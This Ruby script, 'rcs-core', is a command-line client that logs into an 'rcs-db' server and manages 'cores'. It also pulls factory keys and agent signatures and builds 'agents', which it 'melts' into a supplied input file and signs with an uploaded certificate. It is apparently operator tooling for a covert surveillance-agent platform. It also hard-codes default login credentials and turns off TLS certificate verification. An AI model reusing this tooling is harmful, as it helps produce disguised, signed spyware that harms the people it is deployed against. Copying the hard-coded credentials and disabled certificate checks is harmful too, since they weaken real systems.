#!/usr/bin/env ruby

require 'net/http'
require 'json'
require 'open-uri'
require 'pp'
require 'cgi'
require 'optparse'
require 'zip/zip'
require 'zip/zipfilesystem'
require 'securerandom'

class CoreDeveloper

  attr_accessor :name
  attr_accessor :factory
  attr_accessor :output
  attr_accessor :input
  attr_accessor :cert

  def login(host, port, user, pass)
    @host = host || 'rcs-castore'
    @port = port || 443
    @user = user || 'fabiolinux'
    @pass = pass || 'fabiop123'
    @http = Net::HTTP.new(@host, @port)
    @http.use_ssl = true
    @http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    @http.read_timeout = 500

    puts "Performing login to #{@host}:#{@port}"

    account = { user: @user, pass: @pass }
    resp = @http.request_post('/auth/login', account.to_json, nil)
    resp.kind_of? Net::HTTPSuccess or raise(resp.body)
    @cookie = resp['Set-Cookie'] unless resp['Set-Cookie'].nil?

    re = '.*?(session=)([A-Z0-9]{8}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{12})'
    m = Regexp.new(re, Regexp::IGNORECASE).match(@cookie)
    @session = m[2] unless m.nil?

    puts
  end

  def logout
    begin
      @http.request_post('/auth/logout', nil, {'Cookie' => @cookie})
    rescue
      # do nothing
    end
    puts
    puts "Done."
  end

  def list
    puts "List of cores:"
    puts "#{"name".ljust(15)} #{"version".ljust(10)} #{"size".rjust(15)}"
    resp = @http.request_get('/core', {'Cookie' => @cookie})
    resp.kind_of? Net::HTTPSuccess or raise(resp.body)
    list = JSON.parse(resp.body)
    list.each do |core|
      puts "- #{core['name'].ljust(15)} #{core['version'].to_s.ljust(10)} #{core['_grid_size'].to_s.rjust(15)} bytes"
    end
  end

  def get(output)
    raise "Must specify a core name" if @name.nil?
    puts "Retrieving [#{@name}] core..."
    resp = @http.request_get("/core/#{@name}", {'Cookie' => @cookie})
    resp.kind_of? Net::HTTPSuccess or raise(resp.body)

    File.open(output, 'wb') {|f| f.write(resp.body)}
    puts "  --> #{output} saved (#{resp.body.bytesize} bytes)"
  end

  def content
    raise "Must specify a core name" if @name.nil?
    resp = @http.request_get("/core/#{@name}?content=true", {'Cookie' => @cookie})
    resp.kind_of? Net::HTTPSuccess or raise(resp.body)

    puts "Content of core #{@name}"
    list = JSON.parse(resp.body)
    list.each do |file|
      puts "-> #{file['name'].ljust(35)} #{file['size'].to_s.rjust(15)} bytes  #{file['date'].ljust(15)}"
    end
  end

  def replace(file)
    raise "Must specify a core name" if @name.nil?
    content = File.open(file, 'rb') {|f| f.read}
    puts "Replacing [#{@name}] core with new file (#{content.bytesize} bytes)..."

    resp = @http.request_post("/core/#{@name}", content, {'Cookie' => @cookie})
    resp.kind_of? Net::HTTPSuccess or raise(resp.body)

    puts "Replaced."
  end

  def add(file, filename)
    raise "Must specify a core name" if @name.nil?
    filename = file if filename.nil?
    content = File.open(file, 'rb') {|f| f.read}
    puts "Adding [#{file}] to the [#{@name}] core (#{content.bytesize} bytes)"

    resp = @http.request_put("/core/#{@name}?name=#{filename}", content, {'Cookie' => @cookie})
    resp.kind_of? Net::HTTPSuccess or raise(resp.body)
  end

  def remove(file)
    raise "Must specify a core name" if @name.nil?
    puts "Removing [#{file}] from the [#{@name}] core"

    resp = @http.delete("/core/#{@name}?name=#{file}", {'Cookie' => @cookie})
    resp.kind_of? Net::HTTPSuccess or raise(resp.body)
  end

  def delete
    raise "Must specify a core name" if @name.nil?
    puts "Deleting [#{@name}] core"
    resp = @http.delete("/core/#{@name}", {'Cookie' => @cookie})
    resp.kind_of? Net::HTTPSuccess or raise(resp.body)
  end

  def retrieve_factory(ident, show, jsonfile)
    raise("you must specify a factory") if ident.nil?

    resp = @http.request_get('/factory', {'Cookie' => @cookie})
    resp.kind_of? Net::HTTPSuccess or raise(resp.body)
    factories = JSON.parse(resp.body)

    factories.keep_if {|f| f['ident'] == ident}

    raise('factory not found') if factories.empty?
    
    @factory = factories.first

    puts "Using factory: #{@factory['ident']} #{@factory['name']}"

    if show
      resp = @http.request_get("/factory/#{@factory['_id']}", {'Cookie' => @cookie})
      resp.kind_of? Net::HTTPSuccess or raise(resp.body)
      factory = JSON.parse(resp.body)

      logkey = Digest::MD5.digest(factory['logkey']) + SecureRandom.random_bytes(16)
      confkey = Digest::MD5.digest(factory['confkey']) + SecureRandom.random_bytes(16)

      puts "\t-> LOGKEY   : " + logkey.unpack('H*').first
      puts "\t-> CONFKEY  : " + confkey.unpack('H*').first

      resp = @http.request_get("/signature/agent", {'Cookie' => @cookie})
      resp.kind_of? Net::HTTPSuccess or raise(resp.body)
      signature = JSON.parse(resp.body)

      sig = Digest::MD5.digest(signature['value']) + SecureRandom.random_bytes(16)

      puts "\t-> SIGNATURE: " + sig.unpack('H*').first
      puts

      puts "CONFIG JSON:"
      configJson=JSON.parse(factory['configs'].first['config'])
      #puts JSON.pretty_generate(configJson)
      puts configJson
    end

    if jsonfile
      puts "Saving config to: " + jsonfile
      resp = @http.request_get("/factory/#{@factory['_id']}", {'Cookie' => @cookie})
      resp.kind_of? Net::HTTPSuccess or raise(resp.body)
      factory = JSON.parse(resp.body)
      configJson=JSON.parse(factory['configs'].first['config'])

      File.open(jsonfile, 'w') { |f| f.write(JSON.pretty_generate(configJson)) }
    end
  end

  def config(param_file)
    jcontent = File.open(param_file, 'r') {|f| f.read}

    resp = @http.request_post("/agent/add_config", {_id: @factory['_id'], config: jcontent}.to_json, {'Cookie' => @cookie})
    resp.kind_of? Net::HTTPSuccess or raise(resp.body)

    puts "Configuration saved"
  end

  def upload(param_file)
    content = File.open(param_file, 'rb') {|f| f.read}

    puts "Uploading file [#{param_file}]..."

    #RestClient.post('https://#{@host}}:#{@port}/upload', {:Filename => 'upfile', :content => File.new(param_file, 'rb')}, {:cookies => {:session => @session}})

    resp = @http.request_post("/upload", content, {'Cookie' => @cookie})
    resp.kind_of? Net::HTTPSuccess or raise(resp.body)

    return resp.body
  end

  def build(param_file)
    jcontent = File.open(param_file, 'r') {|f| f.read}
    params = JSON.parse(jcontent)

    raise("factory not found") if factory.nil?
    raise("you must specify an output file") if output.nil?

    params[:factory] = {_id: @factory['_id']}

    # set the input file for the melting process
    params['melt'] ||= {}
    params['melt'][:input] = @input unless @input.nil?

    # set the cert file for the signing process
    params['sign'] ||= {}
    params['sign'][:cert] = @cert unless @cert.nil?
    
    puts "Building the agent with the following parameters:"
    puts params.inspect

    resp = @http.request_post("/build", params.to_json, {'Cookie' => @cookie})
    resp.kind_of? Net::HTTPSuccess or raise(resp.body)

    File.open(@output, 'wb') {|f| f.write resp.body}

    puts
    puts "#{resp.body.bytesize} bytes saved to #{@output}"
    puts

    #Zip::ZipFile.open(@output) do |z|
    #  z.each do |f|
    #    puts "#{f.name.ljust(40)} #{f.size.to_s.rjust(10)} #{f.time}"
    #  end
    #end

  end


  def self.run(options)

    begin
      c = CoreDeveloper.new
      c.name = options[:name]

      c.login(options[:db_address], options[:db_port], options[:user], options[:pass])

      c.delete if options[:delete]
      c.replace(options[:replace]) if options[:replace]
      c.add(options[:add],options[:addwithname]) if options[:add]
      c.remove(options[:remove]) if options[:remove]
      c.content if options[:content]
      c.get(options[:get]) if options[:get]

      # list at the end to reflect changes made by the above operations
      c.list if options[:list]

      # building options
      c.retrieve_factory(options[:factory], options[:show_conf], options[:json_conf]) if options[:factory]
      c.output = options[:output]
      c.config(options[:config]) if options[:config]
      c.cert = c.upload(options[:cert]) if options[:cert]
      c.input = c.upload(options[:input]) if options[:input]
      c.build(options[:build]) if options[:build]

    rescue Exception => e
      puts "FATAL: #{e.message}"
      puts "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
      return 1
    ensure
      # clean the session
      c.logout
    end
    
    return 0
  end

end

# This hash will hold all of the options parsed from the command-line by OptionParser.
options = {}

optparse = OptionParser.new do |opts|
  # Set a banner, displayed at the top of the help screen.
  opts.banner = "Usage: rcs-core [options]"

  opts.separator ""
  opts.separator "Core listing:"
  opts.on( '-l', '--list', 'get the list of cores' ) do
    options[:list] = true
  end

  opts.separator ""
  opts.separator "Core selection:"
  opts.on( '-n', '--name NAME', 'identify the core by it\'s name' ) do |name|
    options[:name] = name
  end

  opts.separator ""
  opts.separator "Core operations:"
  opts.on( '-g', '--get FILE', 'get the core from the db and store it in FILE' ) do |file|
    options[:get] = file
  end
  opts.on( '-R', '--replace CORE', 'replace the core in the db (CORE must be a zip file)' ) do |file|
    options[:replace] = file
  end
  opts.on( '-a', '--add FILE', 'add or replace FILE to the core on the db' ) do |file|
    options[:add] = file
  end
  opts.on( '-A', '--addwithname FILE', 'specify the core\'s name on the db' ) do |file|
    options[:addwithname] = file
  end
  opts.on( '-r', '--remove FILE', 'remove FILE from the core on the db' ) do |file|
    options[:remove] = file
  end
  opts.on( '-s', '--show', 'show the content of a core' ) do
    options[:content] = true
  end
  opts.on( '-D', '--delete', 'delete the core from the db' ) do
    options[:delete] = true
  end

  opts.separator ""
  opts.separator "Core building:"
  opts.on( '-f', '--factory IDENT', String, 'factory to be used' ) do |ident|
    factory="RCS_0000000000"
    options[:factory] = factory[0..-ident.size-1] + ident
  end
  opts.on( '-S', '--show-conf', 'show the config of the factory' ) do
    options[:show_conf] = true
  end
   opts.on( '-j', '--json JSON_FILE', String, 'save the config json in a file' ) do |file|
    options[:json_conf] = file
  end
  opts.on( '-b', '--build PARAMS_FILE', String, 'build the factory. PARAMS_FILE is a json file with the parameters' ) do |params|
    options[:build] = params
  end
  opts.on( '-c', '--config CONFIG_FILE', String, 'save the config to the specified factory' ) do |config|
    options[:config] = config
  end
  opts.on( '-C', '--cert FILE', String, 'certificate for the signing phase' ) do |file|
    options[:cert] = file
  end  
  opts.on( '-i', '--input FILE', String, 'the input file for the melting phase of the build' ) do |file|
    options[:input] = file
  end
  opts.on( '-o', '--output FILE', String, 'the output of the build' ) do |file|
    options[:output] = file
  end

  opts.separator ""
  opts.separator "Account:"
  opts.on( '-u', '--user USERNAME', String, 'rcs-db username (SYS priv required)' ) do |user|
    options[:user] = user
  end
  opts.on( '-p', '--password PASSWORD', String, 'rcs-db password' ) do |password|
    options[:pass] = password
  end
  opts.on( '-d', '--db-address HOSTNAME', String, 'Use the rcs-db at HOSTNAME' ) do |host|
    options[:db_address] = host
  end
  opts.on( '-P', '--db-port PORT', Integer, 'Connect to tcp/PORT on rcs-db' ) do |port|
    options[:db_port] = port
  end

  opts.separator ""
  opts.separator "General:"
  opts.on( '-h', '--help', 'Display this screen' ) do
    puts opts
    exit!
  end
end

optparse.parse(ARGV)
pp options

# execute the configurator
r = CoreDeveloper.run(options)
puts "return #{r}"
exit r
